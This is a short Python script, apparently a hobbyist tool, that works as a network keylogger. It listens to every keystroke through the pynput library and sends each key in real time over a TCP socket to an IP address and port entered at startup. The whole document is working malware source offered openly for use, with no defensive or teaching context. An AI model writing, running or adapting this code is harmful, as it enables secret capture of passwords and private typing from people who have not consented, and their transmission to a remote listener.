# *****************************************
# *                                       *
# *   Created by   V A M S I              *
# *                                       *
# *****************************************

import socket 
from pynput import keyboard
ip = input("enter a ip address:")
port = int(input("enter a port number:"))
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ip, port))
def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = str(key)
    client.send(key_data.encode())
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
